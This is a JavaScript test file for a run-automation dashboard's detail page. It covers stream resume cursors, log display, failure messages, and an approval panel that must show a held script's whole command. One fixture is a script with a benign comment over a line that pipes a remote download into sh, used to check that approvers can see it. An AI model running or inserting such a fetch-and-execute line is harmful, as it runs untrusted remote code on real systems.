// Tests for the run detail streaming paths in 22-run-detail.js: the resume cursor a live stream
// opens with, and the split parent's reconcile when its stream ends.
import { test } from "node:test";
import assert from "node:assert/strict";
import { loadParts, ALL_PARTS, sandboxOf } from "./loader.mjs";
import { loadPage, mountPage } from "./pages.mjs";
import { fire } from "./dom.mjs";
import { reply } from "./net.mjs";

// mountDetail loads the run detail parts against a stubbed page: the stream is a recorder rather
// than an EventSource, and every render and fetch outside the code under test is replaced. The
// returned handle exposes the stream URL, the listeners the code registered, and what it fetched.
function mountDetail(shards) {
	const page = loadParts(["01-boot.js", "20-held-copy-stream.js", "22-run-detail.js"]);
	const handle = { page, json: [], events: [], listeners: {}, rendered: 0, shardRenders: 0 };
	page.getJSON = (path) => {
		handle.json.push(path);
		if (path === "/runs/p1") {
			return Promise.resolve({ id: "p1", kind: "split", status: "running", shard_count: 2 });
		}
		if (path === "/runs/p1/shards") return Promise.resolve({ shards: shards || [] });
		return Promise.reject(new Error("unexpected fetch " + path));
	};
	page.loadAllEvents = (id) => {
		handle.events.push(id);
		return Promise.resolve([{ seq: 1, type: "task_start", host: id }]);
	};
	page.renderDetail = () => { handle.rendered++; };
	page.renderShards = () => { handle.shardRenders++; };
	page.setStatus = () => {};
	page.streamURL = async (path) => path;
	page.EventSource = function (url) {
		handle.url = url;
		this.addEventListener = (name, fn) => { handle.listeners[name] = fn; };
		this.close = () => { handle.closed = true; };
	};
	return handle;
}

test("runStreamPath always carries the resume cursor, zero included", () => {
	const app = loadParts(["01-boot.js", "20-held-copy-stream.js", "22-run-detail.js"]);
	const tests = [
		// Test 0: A run with history resumes after its last sequence.
		{ Id: "run_1", After: 42, Want: "/runs/run_1/stream?after=42" },
		// Test 1: A run with no history yet still sends the cursor, so the stream replays from the
		// start instead of starting at whatever the log already holds.
		{ Id: "run_1", After: 0, Want: "/runs/run_1/stream?after=0" },
		// Test 2: A missing cursor is the same as none seen.
		{ Id: "run_1", After: undefined, Want: "/runs/run_1/stream?after=0" },
		// Test 3: The run id is placed in the path.
		{ Id: "run_9", After: 7, Want: "/runs/run_9/stream?after=7" },
	];
	for (const [i, tc] of tests.entries()) {
		const got = app.runStreamPath(tc.Id, tc.After);
		assert.equal(got, tc.Want, "test " + i);
		assert.ok(got.includes("after="), "test " + i + ": the cursor was dropped");
	}
});

test("openStream opens the live stream with a cursor even from an empty history", async () => {
	const handle = mountDetail();
	// Awaited because the URL now carries a minted ticket rather than the reader's own token, so
	// building it is a request rather than string concatenation.
	await handle.page.openStream("run_1", 0);
	assert.equal(handle.url, "/runs/run_1/stream?after=0");
});

test("a split parent reconciles its matrix from a fresh shard read when the stream ends", async () => {
	const handle = mountDetail([{ id: "s0" }, { id: "s1" }]);
	await handle.page.loadParent("p1");
	// The initial view is one read per shard, and the parent's stream is open.
	assert.deepEqual(handle.events, ["s0", "s1"]);
	assert.ok(handle.listeners.end, "the parent stream registered no end listener");

	await handle.listeners.end();
	assert.ok(handle.closed, "the stream was left open");
	// Every shard is read again, so events written between the first read and the stream connecting
	// are on the page rather than lost.
	assert.deepEqual(handle.events, ["s0", "s1", "s0", "s1"],
		"the parent never re-read its shards, so anything the stream missed stayed missing");
	// The folded model is discarded, or the fresh events would never reach the matrix.
	assert.equal(handle.page.detailState.model, null);
	assert.equal(handle.page.detailState.events.length, 2);
});

// mountForLog loads the detail parts against the real detail template and drives the real entry
// point, loadSingle, so the test exercises the wiring rather than the helper it calls.
function mountForLog(logBody, ok = true, logSeq) {
	const app = loadParts(["01-boot.js", "20-held-copy-stream.js", "22-run-detail.js"]);
	const document = mountPage(app, "detail", { vars: { RunID: "run_1", MatrixCap: 20000 } });
	app.loadAllEvents = () => Promise.resolve([]);
	app.renderDetail = () => {};
	app.setStatus = () => {};
	const headers = { get: (name) => (name === "Switchtender-Log-Seq" && logSeq != null ? String(logSeq) : null) };
	app.fetchAuthed = () => Promise.resolve({ ok, headers, text: () => Promise.resolve(logBody) });
	return { app, document };
}

// TestLoadStoredLog pins that a run which has already finished shows the output it produced.
//
// The pane was fed only by the live stream, so a running job showed its output and a finished one
// showed nothing. An Ansible play survived that because its matrix and timeline say what happened.
// A script has neither, since it has no hosts and no tasks, so the page was a header, a row of
// buttons, and empty space where the only thing the run produced should have been.
test("a finished run shows the output it produced", async () => {
	const { app, document } = mountForLog("Fleet capacity report\nweb01 ok\ndb01 hot\n");
	await app.loadSingle({ id: "run_1", status: "succeeded" });
	assert.equal(document.getElementById("log-panel").hidden, false,
		"the output panel stayed hidden for a finished run");
	assert.match(document.getElementById("log").textContent, /Fleet capacity report/);
	assert.equal(document.querySelector("#log-panel h2").textContent, "Output",
		"a finished run's record should not be labeled live");
});

test("an empty or unreadable log leaves the panel hidden rather than showing an empty box", async () => {
	for (const [body, ok, why] of [
		["", true, "an empty log"],
		["   \n\n  ", true, "a log of only whitespace"],
		["anything", false, "a log the server refused"],
	]) {
		const { app, document } = mountForLog(body, ok);
		await app.loadSingle({ id: "run_1", status: "failed" });
		assert.equal(document.getElementById("log-panel").hidden, true,
			why + " should leave the panel hidden");
	}
});

test("only the tail of a long log is loaded, so the pane cannot be flooded", async () => {
	const { app, document } = mountForLog("x".repeat(400000) + "\nLAST LINE\n");
	await app.loadSingle({ id: "run_1", status: "succeeded" });
	const shown = document.getElementById("log").textContent;
	assert.ok(shown.length <= 262144, "loaded " + shown.length + " characters, past the pane's cap");
	assert.match(shown, /LAST LINE/, "the tail is the part worth keeping");
});

// TestLiveRunShowsWhatItAlreadyPrinted pins the join between the stored log and the live stream.
//
// The stream opened with no log cursor starts at the log's current end, so a run's first lines were
// lost to anyone who opened its page after they were written, and a short run that finished before
// the stream connected showed no output at all. The page reads what is stored, then streams from
// the exact point that read ended, so every line appears once.
test("a live run shows what it already printed and streams from where that ends", async () => {
	const { app, document } = mountForLog("TASK [Gather facts]\n", true, 42);
	let opened = null;
	app.openStream = (id, after, logAfter) => { opened = { id, after, logAfter }; return Promise.resolve(); };
	await app.loadSingle({ id: "run_1", status: "running" });
	assert.ok(opened, "a live run should open its stream");
	assert.equal(opened.logAfter, 42,
		"the stream did not resume from where the stored read ended, so lines are lost or repeated");
	assert.equal(document.getElementById("log-panel").hidden, false,
		"what the run printed before the page arrived is not shown");
	assert.match(document.getElementById("log").textContent, /Gather facts/);
	assert.match(document.querySelector("#log-panel h2").textContent, /^Live output/,
		"a live run's pane is not labeled live");
});

// TestFailureReasonIsShown pins that a run which never started says why on the page.
//
// A run that dies before launch produces no events and a zero-byte log, so the page showed STATUS
// failed, an empty timeline, and a row of buttons that opened nothing. The sentence naming the
// cause was on the run object the page had already fetched and was the one field never painted,
// so someone who submitted a terraform run without terraform on PATH had to read server logs to
// learn that.
test("a run that never started says why on the page", () => {
	const app = loadParts(ALL_PARTS);
	const document = mountPage(app, "detail", { vars: { RunID: "run_1", MatrixCap: 20000 } });
	const reason = 'launch error: exec: "terraform": executable file not found in $PATH';
	app.renderHeader({ id: "run_1", status: "failed", tool: "terraform", error: reason });
	const host = document.getElementById("run-failure");
	assert.equal(host.hidden, false, "the reason stayed hidden on a run that never started");
	assert.match(host.textContent, /terraform/,
		"the callout did not carry the reason the server recorded");
	assert.match(host.textContent, /no log or event stream/,
		"the page should say why the timeline and log are empty");
});

// TestNoFailureCalloutWithoutAReason pins that the callout stays out of the way of a normal run.
test("a run with no recorded reason shows no failure callout", () => {
	const app = loadParts(ALL_PARTS);
	const document = mountPage(app, "detail", { vars: { RunID: "run_1", MatrixCap: 20000 } });
	app.renderHeader({ id: "run_1", status: "succeeded", tool: "ansible", playbook: "site.yml" });
	assert.equal(document.getElementById("run-failure").hidden, true,
		"a succeeded run should not carry a failure callout");
});

// TestInterruptedRunIsNotCalledUnstarted pins the two situations run.error covers apart.
//
// The store finishes an abandoned or reclaimed run with a sentence of its own, so run.error is set
// on runs that very much did execute. The callout described every one of them as "This run did not
// start" and added "Nothing executed, so there is no log or event stream" directly above the log
// the run produced.
test("a run that started and was cut short is not described as never having started", () => {
	const app = loadParts(ALL_PARTS);
	const document = mountPage(app, "detail", { vars: { RunID: "run_1", MatrixCap: 20000 } });
	app.renderHeader({
		id: "run_1", status: "failed", tool: "ansible", playbook: "site.yml",
		started_at: "2026-09-15T10:00:00Z", claimed_by: "worker-2",
		error: "interrupted: executor lease expired",
	});
	const host = document.getElementById("run-failure");
	assert.equal(host.hidden, false, "the reason was not shown at all");
	assert.match(host.textContent, /did not finish/,
		"a run that executed was described as never having started");
	assert.doesNotMatch(host.textContent, /no log or event stream/,
		"the page denied the existence of a log the run produced");
});

// TestNeverStartedStillSaysSo pins that the original case is unchanged.
test("a run that never started still says so, and why the log is empty", () => {
	const app = loadParts(ALL_PARTS);
	const document = mountPage(app, "detail", { vars: { RunID: "run_1", MatrixCap: 20000 } });
	app.renderHeader({
		id: "run_1", status: "failed", tool: "terraform",
		error: 'launch error: exec: "terraform": executable file not found in $PATH',
	});
	const host = document.getElementById("run-failure");
	assert.match(host.textContent, /did not start/);
	assert.match(host.textContent, /no log or event stream/);
});

// ROTATE is a script whose first line is a harmless comment and whose second fetches and runs code.
// The runs list labels it by the comment, which is the point of a label and the danger of one on
// the page where the decision is made.
const ROTATE = "# Rotate the nginx access logs\ncurl -s https://203.0.113.9/x | sh";

// CURL is the line an approver has to be able to read before deciding.
const CURL = "curl -s https://203.0.113.9/x | sh";

// visibleText joins the text a reader sees under node: text nodes only, skipping every hidden
// element and never reading an attribute, so a value carried only in a title or tooltip is absent.
function visibleText(node) {
	if (node.nodeType === 3) return node.nodeValue;
	if (node.nodeType !== 1 || node.hidden) return "";
	let out = "";
	for (const child of node.childNodes) out += visibleText(child);
	return out;
}

// mountRun opens a run's page signed in as an admin, answering the run, its events, its steps, and
// any extra routes, and loads it through the page's own entry point.
async function mountRun(run, extra) {
	const page = loadPage("detail", {
		vars: { RunID: run.id },
		quiet: true,
		routes: [
			[new RegExp("^/v1/runs/" + run.id + "$"), reply(run)],
			[new RegExp("^/v1/runs/" + run.id + "/events(\\?|$)"), reply({ events: [] })],
			[new RegExp("^/v1/runs/" + run.id + "/steps(\\?|$)"), reply({ steps: [] })],
			...(extra || []),
		],
	});
	const win = sandboxOf(page.app);
	win.localStorage.setItem("st_role", "admin");
	win.localStorage.setItem("st_user", "approver");
	page.app.loadDetail(run.id);
	await page.clock.flush();
	return page;
}

// heldRun is a run held for approval, with fields overridden by extra.
function heldRun(extra) {
	return Object.assign({
		id: "run_held", status: "pending_approval", actor: "deploy-bot", actor_type: "agent",
		held_by_policy: "agent hold", created_at: "2026-03-01T12:00:00Z",
	}, extra);
}

test("a held script shows its whole command in visible text above Approve", async () => {
	const page = await mountRun(heldRun({ tool: "bash", command: ROTATE }));
	const doc = page.document;
	const panel = doc.getElementById("what-will-run");
	assert.equal(panel.hidden, false, "the What will run panel is hidden on a held run");
	assert.ok(visibleText(panel).includes(CURL),
		"the line that fetches and runs code is not in the visible text of the run page");
	assert.ok(visibleText(doc.querySelector("main")).includes(CURL));
	assert.equal(panel.querySelector("pre").textContent, ROTATE, "the command is not shown whole");
	assert.equal(doc.getElementById("approve-run").hidden, false, "the test needs Approve drawn");
	// The panel sits above the decision buttons in reading order.
	const main = [...doc.querySelectorAll("main *")];
	assert.ok(main.indexOf(panel) < main.indexOf(doc.getElementById("approve-run")),
		"the command is drawn below Approve");
	assert.ok(panel.querySelector(".copy-btn"), "the command has no copy control");
});

test("a finished run keeps the What will run panel", async () => {
	const page = await mountRun(heldRun({
		id: "run_done", status: "succeeded", tool: "bash", command: ROTATE,
		started_at: "2026-03-01T12:01:00Z", ended_at: "2026-03-01T12:02:00Z",
	}), [[/^\/v1\/runs\/run_done\/log/, reply("")]]);
	const panel = page.document.getElementById("what-will-run");
	assert.equal(panel.hidden, false, "the panel is dropped once the run ends");
	assert.ok(visibleText(panel).includes(CURL));
	assert.equal(panel.querySelector("h2").textContent, "What ran");
});

test("a held workflow shows each step's command in that step's block", async () => {
	const page = await mountRun(heldRun({
		id: "run_wf", kind: "pipeline", playbook: "nightly",
		steps: [
			{ name: "prep", tool: "bash", command: "make prep" },
			{ name: "rotate", tool: "bash", command: ROTATE },
		],
	}));
	const doc = page.document;
	assert.equal(doc.getElementById("steps-panel").hidden, false, "a held workflow lists no steps");
	const entries = doc.querySelectorAll("#steps .step-entry");
	assert.equal(entries.length, 2);
	assert.ok(!visibleText(entries[0]).includes(CURL), "step one shows step two's command");
	assert.ok(visibleText(entries[1]).includes(CURL),
		"step two's block does not show the line that fetches and runs code");
	assert.equal(entries[1].querySelector("pre").textContent, ROTATE);
	// A workflow has no command of its own, so the top panel stays out of the way.
	assert.equal(doc.getElementById("what-will-run").hidden, true);

	// Test 1: Once a step has run, its step run carries the block, and a step not reached yet is
	// still drawn from the workflow with its own block.
	page.app.renderSteps([
		{ id: "run_s0", step_name: "prep", step_index: 0, status: "succeeded", tool: "bash", command: "make prep" },
	], { steps: [{ name: "prep", tool: "bash", command: "make prep" }, { name: "rotate", tool: "bash", command: ROTATE }] });
	const after = doc.querySelectorAll("#steps .step-entry");
	assert.equal(after.length, 2);
	assert.ok(visibleText(after[0]).includes("make prep"));
	assert.ok(visibleText(after[1]).includes(CURL));
	assert.match(visibleText(after[1]), /2\. rotate .*not started/);
});

test("a held playbook shows its variables, tags, credential by name, and ref", async () => {
	const page = await mountRun(heldRun({
		id: "run_play", playbook: "site.yml", inventory: "hosts.ini",
		extra_vars: { target_state: "absent" }, tags: ["nginx"], skip_tags: ["restart"],
		credential_ids: ["cred_prod"], git_ref: "release-7", pinned_commit: "0123456789abcdef",
		limit: "web*", timeout: 600,
	}), [[/^\/v1\/credentials$/,
		reply({ credentials: [{ id: "cred_prod", name: "prod-ssh-key", kind: "ssh" }] })]]);
	const panel = page.document.getElementById("what-will-run");
	assert.equal(panel.hidden, false);
	const text = visibleText(panel);
	const tests = [
		// Test 0: The extra variable as key and value.
		{ Want: "target_state=absent", Why: "the extra variable" },
		// Test 1: The tag.
		{ Want: "nginx", Why: "the tag" },
		// Test 2: The skip tag.
		{ Want: "restart", Why: "the skip tag" },
		// Test 3: The credential by its name.
		{ Want: "prod-ssh-key", Why: "the credential's name" },
		// Test 4: The git ref.
		{ Want: "release-7", Why: "the git ref" },
		// Test 5: The pinned commit.
		{ Want: "0123456789abcdef", Why: "the pinned commit" },
		// Test 6: The limit.
		{ Want: "web*", Why: "the limit" },
		// Test 7: The timeout.
		{ Want: "600 seconds", Why: "the timeout" },
		// Test 8: The playbook in the command block.
		{ Want: "site.yml", Why: "the playbook" },
	];
	for (const [i, tc] of tests.entries()) {
		assert.ok(text.includes(tc.Want), "test " + i + ": " + tc.Why + " is not shown: " + text);
	}
	assert.ok(!text.includes("cred_prod"), "the credential is shown by id rather than by name");
	for (const label of ["Extra variables", "Tags", "Skip tags", "Credentials", "Git ref"]) {
		assert.ok(text.includes(label), "the " + label + " line has no label");
	}
});

test("the AI answer says how many values were hidden from the model", async () => {
	const tests = [
		// Test 0: Two hidden values are counted beside the answer.
		{ Hidden: 2, Want: /2 values in the command were hidden from the model/ },
		// Test 1: One uses the singular.
		{ Hidden: 1, Want: /1 value in the command was hidden from the model/ },
		// Test 2: None adds nothing.
		{ Hidden: 0, Want: null },
	];
	for (const [i, tc] of tests.entries()) {
		const page = await mountRun(heldRun({
			id: "run_ai", status: "failed", tool: "bash", command: "export DB_PASSWORD=[redacted]",
			started_at: "2026-03-01T12:01:00Z", ended_at: "2026-03-01T12:02:00Z",
		}), [
			[/^\/v1\/runs\/run_ai\/log/, reply("")],
			[/^\/v1\/runs\/run_ai\/explain$/, reply({ explanation: "The script failed.", hidden_values: tc.Hidden })],
		]);
		fire(page.document.getElementById("explain-run"), "click");
		await page.clock.flush();
		const body = visibleText(page.document.getElementById("explain-body"));
		assert.ok(body.includes("The script failed."), "test " + i + ": the answer is missing: " + body);
		if (tc.Want) {
			assert.match(body, tc.Want, "test " + i);
		} else {
			assert.ok(!/hidden from the model/.test(body), "test " + i + ": a note for nothing hidden");
		}
	}
});
